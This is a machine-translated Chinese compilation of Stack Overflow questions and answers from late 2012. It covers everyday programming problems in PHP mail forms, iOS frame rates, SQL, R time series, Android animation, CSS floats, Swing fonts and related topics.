// Graphics g = ...
VisualStyleRenderer selectionRenderer = new VisualStyleRenderer(VisualStyleElement.TreeView.Item.Selected);
selectionRenderer.DrawBackground(g, someRectangle); 
```

不幸的是，默认窗口主题既不支持`TreeView.Item.Selected`也不`ListView.Item.Selected`支持。但是，可以通过 p/invoke 使用 WinAPI 将主题切换到资源管理器：

```
// C++
SetWindowTheme(hwnd, L"Explorer", nullptr); 
```

然后通过几个 UXTheme.h 例程 P/invoke 他的方式，这非常有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:35:46.487

所选项目背景的系统定义颜色，包括所选文本和所选菜单项，位于`System.Drawing.KnownColor.Highlight`

然后，您可以使用该`Color`结构从`KnownColor`

**例子**

```
System.Drawing.Color.FromKnownColor(System.Drawing.KnownColor.Highlight); 
```

谢谢，
节日快乐！:)

# php - php电子邮件表单中的空变量

> ID：14039244
> 
> 赞同：0
> 
> 时间：2012-12-26T10:26:52.493
> 
> 标签：php, html

我在 php 文件中有一个简单的电子邮件表单，我尝试发送电子邮件，但似乎我的变量为空。在我的代码之后我有一个回显，只是为了测试我的变量内部是否有任何值并且它们没有被打印出来。唯一打印的是“done”和“email $to”。我做错什么了吗？我从 youtube 上的帖子中遵循了这种方法，他做了完全相同的事情，并且对他有用。我还尝试了更多电子邮件 php 文件，但仍然没有。这是我的html和php代码。

php代码：

```
 <?php 

$name = $_REQUEST['author'];
$from = $_REQUEST['email'];
$subj = $_REQUEST['sub'];
$message = $_REQUEST['msg'];

$headers .= "From: ".$from;

$to = "mygmail@gmail.com";

$subject = $subj;
$body = $message;

if(mail($to,$subject,$body,$headers)) {
echo "An e-mail was sent to ".$to." with the subject: ".$subject;
} else {
echo "There was a problem sending the mail. Check your code and make sure that the e-mail address ".$to." is valid";
}

?> 
```

html代码：

```
<form action="formtoemail.php" method="post" enctype="text/plain">
                            <p>
                                <label for="author">Name:</label> 
                                <input type="text" id="author" name="author" class="required input_field" />
                            </p>
                            <p>
                                <label for="email">Email:</label> 
                                <input type="text" id="email" name="email" class="validate-email required input_field" />
                            </p>
                            <p class="no_margin_right">
                                <label for="subject">Subject:</label> 
                                <input type="text" name="sub" id="sub" class="input_field" />
                            </p>
                            <div class="cleaner h20"></div>

                            <label for="text">Message:</label> 
                            <textarea id="msg" name="msg" rows="0" cols="0" class="required"></textarea>
                            <div class="cleaner h20"></div>

                            <input type="submit" value="Send" id="submit" name="submit" class="submit_btn float_l" />
                            <input type="reset" value="Reset" id="reset" name="reset" class="submit_btn float_r" />
                      </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:28:40.320

`POST`您通过`GET`try`$_POST`而不是`$_GET`在 PHP中发送和检索

或在 HTML 中 -

承格从行动到`GET`而不是`POST`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:30:53.643

在您的 HTML 代码中，将“POST”方法更改为“GET”

```
<form action="formtoemail.php" method="get" enctype="text/plain">
                        <p>
                            <label for="author">Name:</label> 
                            <input type="text" id="author" name="author" class="required input_field" />
                        </p>
                        <p>
                            <label for="email">Email:</label> 
                            <input type="text" id="email" name="email" class="validate-email required input_field" />
                        </p>
                        <p class="no_margin_right">
                            <label for="subject">Subject:</label> 
                            <input type="text" name="sub" id="sub" class="input_field" />
                        </p>
                        <div class="cleaner h20"></div>

                        <label for="text">Message:</label> 
                        <textarea id="msg" name="msg" rows="0" cols="0" class="required"></textarea>
                        <div class="cleaner h20"></div>

                        <input type="submit" value="Send" id="submit" name="submit" class="submit_btn float_l" />
                        <input type="reset" value="Reset" id="reset" name="reset" class="submit_btn float_r" />
                  </form> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:31:20.003

使用“get”方法：

```
<form action="formtoemail.php" method="get" enctype="text/plain"> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:38:43.083

你需要改变这个：

```
$headers .= "From: $email"; 
```

对此：

```
$headers = "From: ".$from; 
```

并改变这一点：

```
$subject = "$subj";
$body = "$message";

mail($to, $subject, $body, $headers);

if(mail($to, $subject, $body, $headers)) {
    echo "An e-mail was sent to $to with the subject: $subject";
} else {
    echo "There was a problem sending the mail. Check your code and make sure that the e-mail address $to is valid";
} 
```

对此：

```
$subject = $subj;
$body = $message;

if(mail($to, $subject, $body, $headers)) {
    echo "An e-mail was sent to ".$to." with the subject: ".$subject;
} else {
    echo "There was a problem sending the mail. Check your code and make sure that the e-mail address ".$to." is valid";
} 
```

# ios - iOS AVCaptureSession - 如何获取/设置每秒记录的帧数？

> ID：14039251
> 
> 赞同：16
> 
> 时间：2012-12-26T10:27:26.363
> 
> 标签：ios, frame-rate, avcapturesession

我是 AVCaptureSession 的新手，希望更好地了解如何使用它。所以我设法将视频流捕获为单独的 CIImages 并将它们转换为 UIImages。现在我希望能够获得每秒捕获的帧数，并且最好能够设置它。

知道怎么做吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2016-05-26T06:09:25.617

`AVCaptureConnection's videoMinFrameDuration`已弃用。

您可以使用`AVCaptureDevice`属性来检测支持的视频帧速率范围，并可以使用属性分配最小和最大帧速率。

`device.activeFormat.videoSupportedFrameRateRanges`返回设备支持的所有视频帧率范围。

`device.activeVideoMinFrameDuration`并可`device.activeVideoMaxFrameDuration`用于指定帧持续时间。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-12-26T10:55:52.630

您可以使用`AVCaptureConnection`'`videoMinFrameDuration`访问器来设置值。

请参阅[AVCaptureConnection 文档](https://developer.apple.com/library/mac/#documentation/AVFoundation/Reference/AVCaptureConnection_Class/Reference/Reference.html)

考虑`output`成为`AVCaptureVideoDataOutput`对象。

```
AVCaptureConnection *conn = [output connectionWithMediaType:AVMediaTypeVideo];

if (conn.isVideoMinFrameDurationSupported)
    conn.videoMinFrameDuration = CMTimeMake(1, CAPTURE_FRAMES_PER_SECOND);
if (conn.isVideoMaxFrameDurationSupported)
    conn.videoMaxFrameDuration = CMTimeMake(1, CAPTURE_FRAMES_PER_SECOND); 
```

更多信息，请参阅我在这个[SO 问题中的回答](https://stackoverflow.com/questions/8924299/ios-capturing-image-using-avframework/8924411#8924411)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2019-02-11T16:40:23.100

要设置捕获会话帧速率，您必须在设备上使用**device.activeVideoMinFrameDuration**和**device.activeVideoMaxFrameDuration**（如有必要）进行设置。

在**Swift 4**中，您可以执行以下操作：

```
extension AVCaptureDevice {
    func set(frameRate: Double) {
    guard let range = activeFormat.videoSupportedFrameRateRanges.first,
        range.minFrameRate...range.maxFrameRate ~= frameRate
        else {
            print("Requested FPS is not supported by the device's activeFormat !")
            return
    }

    do { try lockForConfiguration()
        activeVideoMinFrameDuration = CMTimeMake(value: 1, timescale: Int32(frameRate))
        activeVideoMaxFrameDuration = CMTimeMake(value: 1, timescale: Int32(frameRate))
        unlockForConfiguration()
    } catch {
        print("LockForConfiguration failed with error: \(error.localizedDescription)")
    }
  }
} 
```

并称它为

```
device.set(frameRate: 60) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-08-01T07:22:08.327

像这样做

```
if let frameSupportRange = currentCamera.activeFormat.videoSupportedFrameRateRanges.first {
    captureSession.beginConfiguration()
    // currentCamera.activeVideoMinFrameDuration = CMTimeMake(1, Int32(frameSupportRange.maxFrameRate))
    currentCamera.activeVideoMinFrameDuration = CMTimeMake(1, YOUR_FPS_RATE)
    captureSession.commitConfiguration()
} 
```

# javascript - 新窗口在 javascript 中找不到路径

> ID：14039252
> 
> 赞同：0
> 
> 时间：2012-12-26T10:27:39.730
> 
> 标签：javascript, asp.net

我面临 javascript 新窗口的问题。
当我运行临时文件夹中的 start.aspx 文件时。
temp 文件夹也有 download.aspx 文件。当我单击下载按钮时，我编写了一个 javacript 代码。代码是

```
new win = window.open("download.aspx", "new window", param); 
```

download.aspx 文件存在于 start.aspx 所在的同一文件夹中。

以下错误是返回

```
 "'win' is null or not an object". 
```

注意：部署文件后返回此错误。在本地它运行良好。

有没有人帮助我这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:29:04.687

你不需要在`new`这里使用。

改变

```
new win = window.open("download.aspx", "new window", param); 
```

至

```
var win = window.open("download.aspx", "new window", param); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:56:50.507

@Farrukh Shahid

should it really have to be relative? Have you tried using full url?

```
var win = window.open('http://your-server-address/download.aspx', 'new window', param); 
```

# sql - 嵌套查询中的 SQL Server 查询更正

> ID：14039253
> 
> 赞同：1
> 
> 时间：2012-12-26T10:27:41.353
> 
> 标签：sql, sql-server, select

```
SELECT campus,semester, AVG(CountOfStudents)
FROM
(
  SELECT semester,year,campus, count(*) as CountOfStudents
  FROM regestration
  GROUP BY  semester, year, campus,student_id
) t
GROUP BY   campus,semester 
```

我需要做的是找到每个校区每学期的平均人数

我的表结构是：

表名 -**注册**

```
student_id
campus
year
batch
semester 
```

`campus`, `year`,`semester`和`batch`这些可以帮助识别唯一记录，其中`student_id`可能会重复上面的查询给出错误的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:29:27.730

跟着这些步骤：

*   `student_ID`从`GROUP BY`子句中删除和
*   添加`DISTINCT`里面`COUNT()`

询问，

```
SELECT campus, semester, AVG(CountOfStudents)
FROM
(
  SELECT semester, year, campus, count(DISTINCT student_id) as CountOfStudents
  FROM   registration
  GROUP BY  semester, year, campus
) t
GROUP BY   campus, semester 
```

# r - 在 R 中为横截面数据设置时间序列

> ID：14039257
> 
> 赞同：0
> 
> 时间：2012-12-26T10:27:57.397
> 
> 标签：r, time-series

我是 R 新手，我需要在 R（动态概率）中进行时间序列横截面 (TSCS) 分析。我知道如何运行模型，但我需要告诉 R 我正在处理 TSCS 数据。

我有 44 个国家/地区的数据（国家/地区在数据集中以数字和字符形式编码），每个国家都有 52 年的数据。例如：

```
Angola 1950
Angola 1951
.
.
.
Benin 1950
Benin 1951 
```

我找到了该`ts()`命令，但我不确定我是否正确使用了它。到目前为止，我的代码是：

```
outdata50time <- ts(data=outdata50, start=1950, end=2002) 
```

这会奏效吗？或者我需要为这些国家提供不同的课程吗？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T13:40:10.813

加载数据集（我在问题的数据集中添加了一些数据点）：

```
library(data.table)
test <- data.table(structure(list(Country = structure(c(1L, 1L, 2L, 2L), .Label = c("Angola", 
"Benin"), class = "factor"), Year = c(1950L, 1951L, 1950L, 1951L
), Data = c(23L, 24L, 45L, 64L)), .Names = c("Country", "Year", 
"Data"), class = "data.frame", row.names = c(NA, -4L))) 
```

一旦你得到这个，我会创建某种循环来提取与每个国家相关的数据。一个国家的示例如下：

```
ts <- ts(test[Country=="Benin"]$Data, start=(1950), frequency=1)
ts
Time Series:
Start = 1950 
End = 1951 
Frequency = 1 
[1] 45 64 
```

# algorithm - 计算组合

> ID：14039262
> 
> 赞同：0
> 
> 时间：2012-12-26T10:28:15.503
> 
> 标签：algorithm, combinations, combinatorics

我在为以下问题提出解决方案时遇到困难：

我们有 n 个盒子，每个盒子都有一个重量（这意味着盒子 B_i 中的每个球都有重量 C_i），

每个盒子都包含一些球，特别是 {b1,b2,b3...,b_n}（b_i 是盒子 B_i 中的球数）。

我们必须从中选择 m 个球，使得 m 个所选球的权重之和小于给定数量 T。

有多少种方法可以做到？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T11:47:25.753

首先，让我们看一个类似的问题：

类似的问题是：您正在寻求*使总和最大化*（使其仍然小于 T），您正面临[子集和问题](http://en.wikipedia.org/wiki/Subset_sum_problem)的变体，即[NP-Hard](http://en.wikipedia.org/wiki/NP-hard)。此线程中讨论了具有固定数量项目的变化：[Sum-subset with a fixed subset size](https://stackoverflow.com/q/8916539/572670)。

看待问题的另一种方法是使用二维[背包问题](http://en.wikipedia.org/wiki/Knapsack_problem)，其中重量 = 成本，以及元素数量的额外维度。这个概念在这个线程中讨论：[What's the faster way to solve knapsack prob with two properties](https://stackoverflow.com/q/13404173/572670)

现在，看看你的问题：找到实现小于/等于 T 的总和的可能方法的数量仍然是**NP-Hard**。

假设你有一个多项式算法来做它，让它成为`A`。

运行`A(T)`并且`A(T-1)`会给你两个数字，如果`A(T) > A(T-1)`，子集和问题的答案是`true`- 否则是`false`，所以给定这个问题的多项式解决方案，我们可以证明 P=NP。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T12:15:28.787

您可以使用动态编程技术来解决它。

让表示从到`f[i][j][k]`选择`j`球的方法的数量，其权重总和**为**。你想得到的答案是。`B_1``B_i` **`k``f[n][m][T]`**

 **```
Initially, let f[i][j][k] = 1 for all i,j,k
for i = 1 to n
  for j = 0 to m
    for k = 0 to T
      for x = 0 to min(b_i,j)  # choose x balls from B_i
        y = x * C_i
        if y <= k
          f[i][j][k] = f[i][j][k] * f[i-1][j-x][k-y] * Comb(b_i,x) 
```

`Comb(n,k)`是从元素中选择`k`元素的方式数`n`。

时间复杂度为 O(nm T b)，其中 b 是盒子中的最大球数。

请注意，由于`T`大 O 表示法中的 ，理论上它是 NP 难的。但是，在实际应用中，当`T`比较小时，这种算法还是可行的。**

# c# - 是否可以对 WCF 中的 TCP 通信使用 Http 和 XML/SOAP 编码的二进制编码

> ID：14039264
> 
> 赞同：1
> 
> 时间：2012-12-26T10:28:19.247
> 
> 标签：c#, .net, wcf, soap

我知道 WCF 最常见的编码是 basicHttpBinding 和 wsHttpBinding，它们都基于 SOAP/XML，但是 WCF 中有什么方法可以通过 TCP（netTCPBiding）发送 SOAP/XML，反之亦然，即通过 Http 的二进制编码数据。如果是，我该如何在我的 WCF 应用程序中执行此操作

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:53:26.983

netTcpBinding 默认使用[二进制编码](http://msdn.microsoft.com/en-us/library/ms731343.aspx)。如果您需要在 TCP 上使用 SOAP，有一些可用的解决方案。其中之一是此产品：
[http ://www.noemax.com/global/press_releases/september_24_2007.html](http://www.noemax.com/global/press_releases/september_24_2007.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T13:34:11.750

我们可以使用 wcf 配置文件中的 custombinding 属性设置为二进制编码。

# android - 如何通过 ObjectAnimator 旋转可绘制对象？

> ID：14039265
> 
> 赞同：22
> 
> 时间：2012-12-26T10:28:24.417
> 
> 标签：android, rotation, drawable, objectanimator

像这样很好地绘制一个可绘制的作品：

```
if(mAlphaAnimation == null){
        mAlphaAnimation = ObjectAnimator.ofFloat(this, "alpha", 0.0f,1.0f).setDuration(TARGET_ANIM_ALPHA_DURATION);
        mAlphaAnimation.setInterpolator(new AccelerateDecelerateInterpolator());
        mAlphaAnimation.setStartDelay(TARGET_ANIM_ALPHA_DELAY_BASE*power);
        mAlphaAnimation.setRepeatCount(ValueAnimator.INFINITE);
        mAlphaAnimation.setRepeatMode(ValueAnimator.REVERSE);
        mAlphaAnimation.addUpdateListener(this);
 } 
```

但是如果我想像下面这样旋转一个drawable，它就行不通了。

```
private void createRotateAnim(float fromDegress,float toDegress,int duration){
    if(mRotateAnimation == null){
        mRotateAnimation = ObjectAnimator.ofFloat(this, "rotation",fromDegress,toDegress).setDuration(duration);
        mRotateAnimation.setStartDelay(100);
        mRotateAnimation.setInterpolator(new AccelerateInterpolator());
        mRotateAnimation.addUpdateListener(this);
    }
} 
```

任何人都可以帮我解决这个问题，或者这些是创建旋转可绘制动画的任何其他方式。

我很抱歉我的英语不好。

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2015-04-06T05:13:09.633

尝试使用`ObjectAnimator`。

```
ImageView imageview = (ImageView)findViewById(R.id.image);

ObjectAnimator imageViewObjectAnimator = ObjectAnimator.ofFloat(imageview ,
                    "rotation", 0f, 360f);
            imageViewObjectAnimator.setDuration(1000); // miliseconds
            imageViewObjectAnimator.start(); 
```

**编辑** *由于这个问题引起了一些关注，让我解释一下为什么要使用`ObjectAnimator`而不是其他过渡动画师*

使用的事情`ObjectAnimator`是它同时移动项目的可见区域和可点击区域，如果您使用其他动画方法，例如过渡动画或其他动画器，假设您`Button`要从左下角移动屏幕到左上角，它只会移动可见区域而不移动`Button`本身，可点击区域仍将在之前的位置，在这种情况下，可点击区域仍将在左下角而不是您移动的左上角按钮。

如果您对 执行相同操作`ObjectAnimator`，则可见区域和可点击区域都将移动所需的位置。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-12-26T10:59:12.310

试试这个应用于图像的简单旋转动画。

```
 ImageView imageview = (ImageView)findViewById(R.id.myimage);
 RotateAnimation rotate = new RotateAnimation(180, 360, Animation.RELATIVE_TO_SELF,    
 0.5f,  Animation.RELATIVE_TO_SELF, 0.5f);
  rotate.setDuration(500);
 imageview.startAnimation(rotate); 
```

这个答案只是为了提问，可点击区域`View`与当前位置不同是正确的。请检查此问题以使可点击区域正确。[TranslateAnimation 后按钮不可点击](https://stackoverflow.com/questions/9067778/button-is-not-clickable-after-translateanimation)

# html - 滚动条存在时浮动元素跳到底部

> ID：14039266
> 
> 赞同：0
> 
> 时间：2012-12-26T10:28:31.490
> 
> 标签：html, css

```
<div class="con">
    <div class="left" id="left">
        <input type="button" value="set the height of the left panel" id="open" />
    </div>
    <div class="right" id="right"></div>
</div> 
```

`left`和`right`面板都是向左浮动的，在没有滚动条的情况下可以正常工作，但是如果`left`面板的高度发生变化，滚动条会显示，那么`right`面板会下到底部。

请参阅[此处的](http://jsfiddle.net/hgm7L/)示例：

起初，`right`div 会显示在 旁边`left`，当您单击按钮时，`right`将转到底部。

如何解决？

* * *

## 更新

实际上我无法设置左右 div 的绝对大小，因为我希望它们根据内容自动调整大小。

完整代码：

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style type="text/css">
        html,body{
            padding:0px;
            margin:0px;
            height:100%;
        }
        .con{
            float:left;
            position:relative;
            left:100px;;
            top:100px;
            border:2px solid red;
            max-height:80%;
            overflow-y:auto;
        }
        .left{
            background-color:black;
            position:relative;
            float:left;

        }
        .right{
            background-color:blue;
            position:relative;
            float:left;
            width:300px;
            height:200px;
        }
    </style>
    <script type="text/javascript">
        window.onload=function(){
            document.getElementById("open").onclick=function(){
                document.getElementById("left").style.height="900px";
                //document.getElementById("right").style.width="300px";
                //document.getElementById("right").style.height="500px";
            }
        }
    </script>
</head>
<body>
    <div class="con">
        <div class="left" id="left">
            <input type="button" value="set the height of the left panel" id="open" />
        </div>
        <div class="right" id="right"></div>
    </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:34:36.017

这有效...

```
.con{
    float:left;
    position:relative;
    left:100px;;
    top:100px;
    border:2px solid red;
    max-height:80%;
    overflow-y:scroll;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:45:39.837

最好的方法是让左侧和/或右侧面板更“窄”一些

# java - java swing 其他应用程序的最小（或范围）字体大小

> ID：14039270
> 
> 赞同：6
> 
> 时间：2012-12-26T10:28:40.213
> 
> 标签：java, swing, fonts, themes, nimbus

对于 Swing 应用程序，组件的默认字体设置在当前主题中，并且可以使用 UIManager 检索：

```
public class JavaTesting {
    public static void main(String[] args) {
        System.out.println(UIManager.get("Label.font"));
    }
} 
```

这可以在 JAVA_HOME/lib/swing.properties 中针对应用范围进行调整，例如：

```
swing.defaultlaf=javax.swing.plaf.nimbus.NimbusLookAndFeel 
```

或在命令行设置：

```
java -Dswing.defaultlaf=javax.swing.plaf.nimbus.NimbusLookAndFeel MyApp 
```

或者应用程序本身会记住它的外观和感觉，并将这个值存储在配置（文件）中的某个位置。它可以工作，因为应用程序可以为自己设置外观，例如：

```
UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel"); 
```

这一切看起来都不错，但应用程序通常需要**较小的字体**（例如标签的不重要状态栏消息）或**较大的字体**（带有某些标题的标签）。**有什么推荐的方法吗？** 作为高密度监视器的用户，我不得不丢弃许多使用这样的代码的 Java 应用程序 - 从 squirrel sql 复制的源代码：

```
Font tmp = (Font)UIManager.get("Label.font");
if (tmp != null) {
        Font font = tmp.deriveFont(10.0f);
        _statusBarFontInfo = new FontInfo(font);
} 
```

此示例代码使状态栏完全不可读，但大多数组件都调整为新的、更大的字体。

为了创建我自己的应用程序，我可能会使用一些**比例**（例如主题字体的 50% 到 150%），但是**硬编码 0.50 - 1.50 范围看起来**也是一个**不好**的编码习惯。它不能解决我没有源代码的应用程序的问题。这属于主题/L&F（外观和感觉，外观和感觉）。例子：

```
FontUIResource Label_font_resource = (FontUIResource)javax.swing.UIManager.get("Label.font");
Font Label_font = Label_font_resource;
Font Label_font_bigger = Label_font.deriveFont(Label_font.getSize2D() * 1.5f); 
```

在我尝试一些丑陋的 hack 之前值得一问，比如用自定义组件替换 swing 默认组件，或 Graphics2D.setFont 调整，或任何其他可怕的东西。:-)

**编辑**：唯一存在的是尺寸变体，仅受 Nimbus 主题支持。允许的值为“mini”、“small”、“regular”、“large”。例子：

```
JComponent mini = new JButton("mini");
mini.putClientProperty("JComponent.sizeVariant", "mini"); 
```

然而，查看 Nimbus 主题的源代码，不可能简单地调整这些值（例如，将“大”缩放为 150%），它实际上是硬编码的！

```
package javax.swing.plaf.nimbus;

public final class NimbusStyle extends SynthStyle
{
  public static final String LARGE_KEY = "large";
  public static final String SMALL_KEY = "small";
  public static final String MINI_KEY = "mini";
  public static final double LARGE_SCALE = 1.15D;
  public static final double SMALL_SCALE = 0.857D;
  public static final double MINI_SCALE = 0.714D; 
```

这个值只能由非常高级的用户编辑（例如在 JAVA_HOME/lib/rt.jar 中使用名为“rej”的程序编辑常量池）——我试过了，它工作，但它并不总是工作，因为他们实际上在几个地方硬编码（!!）常量（这真的是最好的质量 - 标准库吗？），例如：

```
if ("large".equals(str))
{
    this.scrollBarWidth = (int)(this.scrollBarWidth * 1.15D);
    this.incrGap = (int)(this.incrGap * 1.15D);
    this.decrGap = (int)(this.decrGap * 1.15D);
} 
```

**底线：不，Java 外观和感觉目前不支持。我建议使用比率，例如默认字体大小的 0.7 - 1.3。**

```
JLabel smallLabel = new JLabel("some text");
smallLabel.setFont(smallLabel.getFont().deriveFont(0.8f * smallLabel.getFont().getSize2D())); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T15:57:27.570

`Font`Nimbus 没有更改 ，而是有一个`sizeVariant`用于迷你、小型、常规和大型组件。本文有更多示例：[调整组件大小](http://docs.oracle.com/javase/tutorial/uiswing/lookandfeel/size.html)。

```
myButton.putClientProperty("JComponent.sizeVariant", "mini"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T14:07:11.750

我在 Swing 应用程序中所做的是包含一个 Font 类。每个其他需要字体的 Swing 组件都会调用 Font 类。

```
import java.awt.Font;

public class MinesweeperFont {

    protected static final String FONT_NAME = "Comic Sans MS";

    public static Font getBoldFont(int pointSize) {
        return new Font(FONT_NAME, Font.BOLD, pointSize);
    }

} 
```

现在在这种情况下，我只需要一种字体类型。我让应用程序选择字体大小。

您可以为所需的每种字体大小定义一个方法，可能将它们称为小号、中号和大号，因此您可以稍后根据需要更改这些方法以使用不同的磅值或类型。

由于您的整个应用程序都调用了这些字体静态方法，因此您只需在一处进行字体更改。

# joomla - Joomla：博客中的新闻

> ID：14039272
> 
> 赞同：3
> 
> 时间：2012-12-26T10:28:48.543
> 
> 标签：joomla, joomla2.5

这可能是一个非常简单的问题，如果之前有人问过，我很抱歉，但我还没有找到答案。

我的主页仅列出新闻（博客）...（没有左侧菜单，侧边栏中没有右侧菜单）当用户单击文章时，它会在同一主页中显示文章。我想要的是，当用户单击主页中的文章时，它将重定向到另一个菜单（新闻），在该菜单中，左侧边栏上显示了一个带有新闻列表项的菜单，并且在内容中单击了文章的内容。

那可能吗 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:40:56.937

您必须创建一个带有左侧栏和右侧内容的自定义模块。在左侧栏中放置查询以填充所选类别的新闻标题。在右侧根据文章 ID 显示 #_content 表中的介绍性文本或全文。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T12:38:56.287

您必须创建一个隐藏菜单以在内页中显示新闻。转到菜单管理器并创建一个标题为隐藏菜单和菜单类型隐藏的新菜单。在该菜单中添加文章类别博客类型的新菜单项。选择这些首页文章来自的类别。保存并检查网站的前端。

# iphone - 显示在 UiTableViewCell 部分之外的文本

> ID：14039273
> 
> 赞同：1
> 
> 时间：2012-12-26T10:28:55.073
> 
> 标签：iphone, ios, ipad, uitableview

我`UITableview`正在显示数据，但是一个部分中的文本正在移出框并显示在其他部分中..我不知道为什么？

![在此处输入图像描述](../Images/f93e87cb64f21fea3b21a4b191f16fe5.png)

这是我的代码：

```
if(indexPath.section == 0){
    cell.textLabel.font = [UIFont boldSystemFontOfSize:14];
    cell.textLabel.textColor = [UIColor blackColor];
        cell.detailTextLabel.numberOfLines=3;
    cell.detailTextLabel.textColor=[UIColor colorWithRed:0.40 green:0.40 blue:0.40 alpha:1.0];
    cell.textLabel.text=[NSString stringWithFormat:@"School Hours:"];
    cell.detailTextLabel.text=[NSString stringWithFormat:@"Take in time: %@ \nDissmiss time:%@ \nPhone No: %@ ",[array objectAtIndex:indexPath.row],[array1 objectAtIndex:indexPath.row],[array2 objectAtIndex:indexPath.row]];

    cell.textLabel.backgroundColor=[UIColor clearColor];
    cell.detailTextLabel.backgroundColor=[UIColor clearColor];
    }
    else if(indexPath.section == 1){cell.textLabel.font = [UIFont boldSystemFontOfSize:14];
        cell.textLabel.textColor = [UIColor blackColor];
         cell.detailTextLabel.numberOfLines=3;
        cell.detailTextLabel.textColor=[UIColor colorWithRed:0.40 green:0.40 blue:0.40 alpha:1.0];
        cell.textLabel.text=[NSString stringWithFormat:@"Principal"];
        NSString *thumbs = [NSString stringWithFormat:@"%@", [imagearray objectAtIndex:indexPath.row]];
        UIImage *thumbs1 = [UIImage imageWithData:[NSData dataWithContentsOfURL:
                                                  [NSURL URLWithString:thumbs]]];
       // cell.imageView.image = [UIImage imageNamed:th];
        cell.detailTextLabel.text=[NSString stringWithFormat:@" %@  ",[imagearray objectAtIndex:indexPath.row]] ;
        cell.textLabel.backgroundColor=[UIColor clearColor];
        cell.detailTextLabel.backgroundColor=[UIColor clearColor];} 
```

任何人都可以让我知道出了什么问题。我什至为这些部分设置了页眉和页脚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:31:30.127

设置单元格的高度例如...

```
 - (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {

    NSString *titleString = yourTitleString;///here just write your string here
    NSString *detailString = [NSString stringWithFormat:@"Take in time: %@ \nDissmiss time:%@ \nPhone No: %@ ",[array objectAtIndex:indexPath.row],[array1 objectAtIndex:indexPath.row],[array2 objectAtIndex:indexPath.row]];
    CGSize titleSize = [titleString sizeWithFont:[UIFont boldSystemFontOfSize:18] constrainedToSize:CGSizeMake(300, MAXFLOAT) lineBreakMode:UILineBreakModeWordWrap];
    CGSize detailSize = [detailString sizeWithFont:[UIFont systemFontOfSize:14] constrainedToSize:CGSizeMake(300, MAXFLOAT) lineBreakMode:UILineBreakModeWordWrap];

    return detailSize.height+titleSize.height;
} 
```

我只是为单元格的动态高度设置了通用单元格的代码，请参见下面的`cellForRowAtIndexPath`方法代码...

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier] autorelease];
    }

    cell.textLabel.text = @"YourTitle";
    cell.textLabel.font = [UIFont boldSystemFontOfSize:18];
    cell.textLabel.numberOfLines = ceilf([@"YourTitle" sizeWithFont:[UIFont boldSystemFontOfSize:18] constrainedToSize:CGSizeMake(300, MAXFLOAT) lineBreakMode:UILineBreakModeWordWrap].height/20.0);
    cell.detailTextLabel.text = [NSString stringWithFormat:@"Take in time: %@ \nDissmiss time:%@ \nPhone No: %@ ",[array objectAtIndex:indexPath.row],[array1 objectAtIndex:indexPath.row],[array2 objectAtIndex:indexPath.row]];
    cell.detailTextLabel.font = [UIFont systemFontOfSize:14];
    cell.detailTextLabel.numberOfLines = ceilf([[NSString stringWithFormat:@"Take in time: %@ \nDissmiss time:%@ \nPhone No: %@ ",[array objectAtIndex:indexPath.row],[array1 objectAtIndex:indexPath.row],[array2 objectAtIndex:indexPath.row]]; sizeWithFont:[UIFont systemFontOfSize:14] constrainedToSize:CGSizeMake(300, MAXFLOAT) lineBreakMode:UILineBreakModeWordWrap].height/20.0);

    return cell;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:48:47.667

对于如此庞大的数据，您需要截断数据以显示它。为此，您可以使用：

```
[[cell detailTextLabel] setLineBreakMode:UILineBreakModeTailTruncation];
 cell.detailTextLabel.numberOfLines = 0; 
```

另一种选择是您需要使用`heightForRowAtIndexPath`委托调整 tableViewCell 的高度。

# php - 将日期与用户元表的元数据区分开来

> ID：14039274
> 
> 赞同：0
> 
> 时间：2012-12-26T10:28:56.213
> 
> 标签：php, wordpress

我通过下面的代码从用户元表中找到了最后登录日期。

```
$current_user = wp_get_current_user();
  $time = get_user_meta($current_user,"last_login", true);
  echo $time; 
```

我得到了如下所示的输出。

```
2012-12-26 10:00:40 
```

